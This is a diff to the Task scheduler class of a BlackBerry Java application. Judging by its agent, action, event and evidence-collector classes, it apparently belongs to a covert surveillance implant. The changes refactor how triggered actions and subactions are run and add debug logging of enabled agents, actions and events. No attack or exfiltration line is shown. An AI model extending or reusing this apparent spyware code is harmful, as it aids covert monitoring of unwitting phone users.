@@ -16,11 +16,14 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.RuntimeStore;
+import net.rim.device.api.util.IntEnumeration;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
+import blackberry.agent.Agent;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Check;
@@ -115,8 +118,11 @@ public final class Task implements Singleton {
      * @return true, if successful
      */
     public boolean checkActions() {
+        //#ifdef OPTIMIZE_TASK
+        //#else
         Utils.sleep(1000);
-
+        //#endif
+        
         try {
             for (;;) {
 
@@ -125,7 +131,7 @@ public final class Task implements Singleton {
                 //#ifdef DEBUG
                 // debug.trace("checkActions");
                 //#endif
-                final int[] actionIds = status.getActionIdsTriggered();
+                final int[] actionIds = status.getTriggeredActions();
 
                 //TODO: getActionIdTriggered deve diventare una lista
                 //TODO: se getActionIdTriggered e' vuota, deve bloccarsi
@@ -138,24 +144,28 @@ public final class Task implements Singleton {
                         final int actionId = actionIds[k];
 
                         final Action action = status.getAction(actionId);
-
                         lastAction = action.toString();
 
-                        if (action.isTriggered() == false) {
-                            //#ifdef DEBUG
-                            debug.warn("Should be triggered: " + action);
-                            //#endif
-                            continue;
-                        }
+                        /*
+                         * if (action.isTriggered() == false) { //#ifdef DEBUG
+                         * debug.warn("Should be triggered: " + action);
+                         * //#endif continue; }
+                         */
 
                         //#ifdef DEBUG
                         debug.trace("CheckActions() triggered: " + action);
                         //#endif
-                        action.setTriggered(false, null);
+
+                        status.unTriggerAction(action);
+                        //action.setTriggered(false, null);
 
                         status.synced = false;
                         final Vector subActions = action.getSubActionsList();
                         final int ssize = subActions.size();
+
+                        //#ifdef DEBUG
+                        debug.trace("checkActions, " + ssize + " subactions");
+                        //#endif
 
                         for (int j = 0; j < ssize; ++j) {
                             try {
@@ -174,12 +184,16 @@ public final class Task implements Singleton {
                                  */
 
                                 //#ifdef DEBUG
-                                debug.trace("CheckActions() prepareExecute: "
-                                        + action);
+                                debug
+                                        .info("CheckActions() executing subaction ("
+                                                + (j + 1)
+                                                + "/"
+                                                + ssize
+                                                + ") : " + action);
                                 //#endif
 
-                                subAction.prepareExecute(action
-                                        .getTriggeringEvent());
+                                // no callingEvent
+                                subAction.prepareExecute(null);
                                 actionThread = new Thread(subAction);
                                 actionThread.start();
 
@@ -469,6 +483,39 @@ public final class Task implements Singleton {
 
             return false;
         }
+
+        //#ifdef DEBUG
+        debug.trace("----------");
+        debug.info("AGENTS");
+        Vector vector = status.getAgentsList();
+        for (int i = 0; i < vector.size(); i++) {
+            Agent agent = (Agent) vector.elementAt(i);
+            if (agent.isEnabled()) {  
+                debug.info("    " +agent.toString());
+            }
+        }
+        
+        debug.info("ACTIONS");
+        vector = status.getActionsList();
+        for (int i = 0; i < vector.size(); i++) {
+            Action action = (Action) vector.elementAt(i);
+            debug.info("    " +action.toString());
+            Vector subs = action.getSubActionsList();
+            for (int j = 0; j < subs.size(); j++) {
+                SubAction sub = (SubAction) subs.elementAt(j);
+                debug.info("        " +sub.toString());
+            }
+        }
+        
+        debug.info("EVENTS");
+        vector = status.getEventsList();
+        for (int i = 0; i < vector.size(); i++) {
+            Event event = (Event) vector.elementAt(i);
+            if (event.isEnabled()) {
+                debug.info("    "+event.toString());
+            }
+        }
+        //#endif
 
         if (logCollector != null) {
             logCollector.initEvidences();
